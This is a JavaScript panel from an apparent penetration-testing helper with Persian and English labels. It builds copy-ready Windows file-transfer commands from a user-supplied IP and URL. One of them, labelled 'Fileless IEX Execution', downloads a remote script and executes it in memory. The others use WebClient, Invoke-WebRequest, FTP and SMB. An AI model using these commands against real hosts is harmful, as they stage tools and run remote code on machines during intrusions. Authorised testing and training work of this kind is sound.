export default function render(lang) {
  const t = (fa, en) => lang === 'fa' ? fa : en;
  return `<div class="panel">
    <h3 class="section-title">${t('انتقال فایل ویندوز', 'Windows File Transfer')}</h3>
    <div class="stack">
      <div class="grid two">
        <div>
          <label class="label">${t('آی‌پی', 'IP')}</label>
          <input id="ft-ip" class="field" type="text" placeholder="192.168.1.100">
        </div>
        <div>
          <label class="label">${t('پورت', 'Port')}</label>
          <input id="ft-port" class="field" type="number" placeholder="80">
        </div>
      </div>
      <div>
        <label class="label">${t('آدرس فایل', 'File URL / Path')}</label>
        <input id="ft-url" class="field" type="text" placeholder="http://192.168.1.100/file.exe">
      </div>
      <div>
        <label class="label">${t('نام فایل خروجی', 'Output Filename')}</label>
        <input id="ft-out" class="field" type="text" placeholder="file.exe">
      </div>
      <div class="section-title">${t('Net.WebClient Download', 'Net.WebClient Download')}</div>
      <pre class="out" id="ft-cmd1" style="cursor:pointer" onclick="ftCopy('ft-cmd1')"></pre>
      <div class="section-title">${t('Fileless IEX Execution', 'Fileless IEX Execution')}</div>
      <pre class="out" id="ft-cmd2" style="cursor:pointer" onclick="ftCopy('ft-cmd2')"></pre>
      <div class="section-title">${t('Invoke-WebRequest', 'Invoke-WebRequest')}</div>
      <pre class="out" id="ft-cmd3" style="cursor:pointer" onclick="ftCopy('ft-cmd3')"></pre>
      <div class="section-title">${t('FTP Download', 'FTP Download')}</div>
      <pre class="out" id="ft-cmd4" style="cursor:pointer" onclick="ftCopy('ft-cmd4')"></pre>
      <div class="section-title">${t('SMB Copy', 'SMB Copy')}</div>
      <pre class="out" id="ft-cmd5" style="cursor:pointer" onclick="ftCopy('ft-cmd5')"></pre>
    </div>
  </div>`;
}

export function init() {
  function updateCmds() {
    const ip = document.getElementById('ft-ip').value.trim() || '192.168.1.100';
    const port = document.getElementById('ft-port').value.trim() || '80';
    const url = document.getElementById('ft-url').value.trim() || 'http://' + ip + ':' + port + '/file.exe';
    const out = document.getElementById('ft-out').value.trim() || 'file.exe';
    document.getElementById('ft-cmd1').textContent = '(New-Object Net.WebClient).DownloadFile("' + url + '", "' + out + '")';
    document.getElementById('ft-cmd2').textContent = 'IEX(New-Object Net.WebClient).DownloadString("' + url + '")';
    document.getElementById('ft-cmd3').textContent = 'Invoke-WebRequest -Uri "' + url + '" -OutFile "' + out + '"';
    document.getElementById('ft-cmd4').textContent = '(New-Object Net.WebClient).DownloadFile("ftp://' + ip + '/' + out + '", "' + out + '")';
    document.getElementById('ft-cmd5').textContent = 'copy \\\\' + ip + '\\share\\' + out + ' .\\' + out;
  }
  window.ftCopy = function(id) {
    navigator.clipboard.writeText(document.getElementById(id).textContent);
  };
  ['ft-ip', 'ft-port', 'ft-url', 'ft-out'].forEach(id => {
    document.getElementById(id).addEventListener('input', updateCmds);
  });
  updateCmds();
}
